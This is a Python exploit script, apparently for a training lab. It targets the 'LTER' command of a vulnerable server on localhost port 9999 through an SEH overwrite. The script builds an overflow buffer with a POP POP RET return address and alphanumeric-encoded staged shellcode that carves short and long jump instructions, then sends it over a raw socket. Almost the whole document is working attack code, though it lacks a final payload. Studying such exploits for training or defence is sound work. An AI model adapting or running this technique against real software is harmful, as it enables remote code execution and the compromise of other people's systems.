import socket
import struct
import os
import sys

vuln_command = "LTER _.?"
crash = 4000
offset = 3520
seh = struct.pack("<I", 0x6250120b)        # POP POP RET

# 1st Stage Shellcode (Short JMP - nSEH)
stage1 = ""
stage1 += "\x75\x08"                       # JNZ SHORT [+0x10] = Jump if ZF is not 0
stage1 += "\x74\x06"                       # JZ SHORT [+0x8] = Jump if ZF is 0

# 2nd Stage Shellcode (Short JMP - Encoded \xEB\x80)
stage2 = ""
stage2 += "\x54"                           # PUSH ESP 
stage2 += "\x58"                           # POP EAX
stage2 += "\x66\x05\x59\x13"               # ADD AX,0x1359 (018BFFFD - 016EECA4 = 0x1359)
stage2 += "\x50"                           # PUSH EAX
stage2 += "\x5C"                           # POP ESP
stage2 += "\x25\x4A\x4D\x4E\x55"           # Zero out EAX
stage2 += "\x25\x35\x32\x31\x2A"           # 
stage2 += "\x2D\x7F\x7F\x7F\x7F"           # Carving \xEB\x80\x90\x90 
stage2 += "\x2D\x7F\x7F\x7F\x7F"           # 
stage2 += "\x2D\x02\x50\x50\x50"           # 
stage2 += "\x2D\x15\x30\x20\x20"           # 
stage2 += "\x50"                           # PUSH EAX

# 3rd Stage Shellcode (Long JMP)
stage3 = ""
stage3 += "\x54"                           # PUSH ESP 
stage3 += "\x58"                           # POP EAX
stage3 += "\x2C\x38"                       # ADD AL,0x38 (0187FFF9 - 0187FFC1 = 0x39)
stage3 += "\x50"                           # PUSH EAX
stage3 += "\x5C"                           # POP ESP
stage3 += "\x54"                           # PUSH ESP
stage3 += "\x5B"                           # POP EBX
stage3 += "\x25\x4A\x4D\x4E\x55"           # Zero out EAX
stage3 += "\x25\x35\x32\x31\x2A"           #
stage3 += "\x2D\x7F\x7F\x7F\x7F"           # Carving \x00\x00\xFF\xD3
stage3 += "\x2D\x7F\x7F\x7F\x7F"           #
stage3 += "\x2D\x02\x01\x02\x2D"           #
stage3 += "\x50"                           # PUSH EAX
stage3 += "\x25\x4A\x4D\x4E\x55"           # Zero out EAX
stage3 += "\x25\x35\x32\x31\x2A"           # 
stage3 += "\x05\x41\x76\x65\x07"           # Carving \x81\xEB\xB9\x0D
stage3 += "\x05\x40\x75\x54\x06"           #
stage3 += "\x50"                           # PUSH EAX

payload = ""
payload += vuln_command
payload += "A" * (offset - len(stage1) - 73)
payload += stage3
payload += "B" * (73 - len(stage3))
payload += stage1
payload += seh
payload += "C" * 2
payload += stage2
payload += "C" * (crash - 4 - offset - 2 - len(stage2))

print "[+] Sending buffer (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
print(s.recv(1024))
s.send(payload)
s.close()

